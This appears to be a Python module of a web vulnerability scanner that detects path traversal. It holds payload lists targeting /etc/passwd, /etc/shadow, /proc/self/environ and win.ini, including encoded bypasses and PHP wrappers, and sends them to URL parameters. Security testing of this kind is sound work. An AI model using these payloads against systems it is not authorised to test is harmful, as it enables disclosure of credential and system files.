"""
Path Traversal Scanner
"""
import re
from typing import List, Optional
from .base import BaseScanner, Vulnerability, Severity


class PathTraversalScanner(BaseScanner):
    """Path traversal vulnerability scanner"""
    
    # Linux/Unix traversal payloads
    LINUX_PAYLOADS = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "../../../etc/shadow",
        "../../../etc/hosts",
        "../../../proc/version",
        "../../../proc/self/environ",
        "....//....//....//etc/passwd%00",
        "../../../etc/passwd%00.txt",
        "../../../etc/passwd\0",
    ]
    
    # Windows traversal payloads
    WINDOWS_PAYLOADS = [
        "..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        "..%2f..%2f..%2fwindows%2fwin.ini",
        "..%252f..%252f..%252fwindows%252fwin.ini",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\boot.ini",
        "..%5c..%5c..%5cboot.ini",
        "..\\..\\..\\windows\\win.ini%00",
        "..\\..\\..\\windows\\win.ini%00.txt",
    ]
    
    # Unicode and encoded bypasses
    ENCODED_PAYLOADS = [
        "%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
        "%e0%80%ae%e0%80%ae%e0%80%afetc%e0%80%afpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd",
    ]
    
    # Wrapper technique payloads
    WRAPPER_PAYLOADS = [
        "php://filter/read=string.rot13/resource=../../../etc/passwd",
        "php://filter/convert.base64-encode/resource=../../../etc/passwd",
        "expect://id",
        "file:///etc/passwd",
        "data://text/plain;base64,base64data",
    ]
    
    # Success indicators
    SUCCESS_PATTERNS = {
        "passwd": [
            r"root:x:\d+:\d+:",
            r"daemon:x:\d+:\d+:",
            r"bin:x:\d+:\d+:",
        ],
        "win.ini": [
            r"\[fonts\]",
            r"\[extensions\]",
            r"\[mci extensions\]",
            r"for 16-bit app support",
        ],
        "hosts": [
            r"127\.0\.0\.1\s+localhost",
            r"::1\s+localhost",
        ],
        "shadow": [
            r"root:\$[156]?\$",
            r"daemon:\$[156]?\$",
        ],
    }
    
    async def scan(self, url: str, params: Optional[dict] = None, method: str = "GET", **kwargs) -> List[Vulnerability]:
        """Scan for path traversal vulnerabilities"""
        vulnerabilities = []
        
        test_params = params or {}
        if not test_params:
            if "?" in url:
                query_string = url.split("?")[1]
                for param in query_string.split("&"):
                    if "=" in param:
                        key, value = param.split("=", 1)
                        test_params[key] = value
        
        all_payloads = (
            self.LINUX_PAYLOADS +
            self.WINDOWS_PAYLOADS +
            self.ENCODED_PAYLOADS +
            self.WRAPPER_PAYLOADS
        )
        
        for param_name, param_value in test_params.items():
            for payload in all_payloads[:15]:  # Limit for performance
                try:
                    test_params_dict = {param_name: payload}
                    
                    if method.upper() == "GET":
                        resp = await self.http_client.get(url, params=test_params_dict)
                    else:
                        resp = await self.http_client.post(url, data=test_params_dict)
                    
                    # Check for file content indicators
                    file_type = self._detect_file_type(payload)
                    if file_type and self._check_file_content(resp.text, file_type):
                        return self._create_vulnerability(
                            name="Path Traversal",
                            severity=Severity.HIGH,
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            description=f"Path traversal vulnerability detected. File type: {file_type}",
                            evidence=f"File content indicators found in response",
                            recommendation="Validate and sanitize file paths. Use whitelist of allowed files. Avoid user input in file operations.",
                            cwe="CWE-22"
                        )
                except:
                    continue
        
        return vulnerabilities
    
    def _detect_file_type(self, payload: str) -> Optional[str]:
        """Detect what type of file the payload is trying to access"""
        payload_lower = payload.lower()
        
        if "passwd" in payload_lower:
            return "passwd"
        elif "win.ini" in payload_lower:
            return "win.ini"
        elif "hosts" in payload_lower:
            return "hosts"
        elif "shadow" in payload_lower:
            return "shadow"
        elif "environ" in payload_lower:
            return "environ"
        elif "version" in payload_lower:
            return "version"
        
        return None
    
    def _check_file_content(self, text: str, file_type: str) -> bool:
        """Check if response contains expected file content"""
        if file_type in self.SUCCESS_PATTERNS:
            for pattern in self.SUCCESS_PATTERNS[file_type]:
                if re.search(pattern, text, re.IGNORECASE):
                    return True
        
        # Generic checks
        if file_type == "passwd" and re.search(r"^\w+:\w*:\d+:\d+:", text, re.MULTILINE):
            return True
        
        if file_type == "win.ini" and ("[fonts]" in text.lower() or "[extensions]" in text.lower()):
            return True
        
        return False

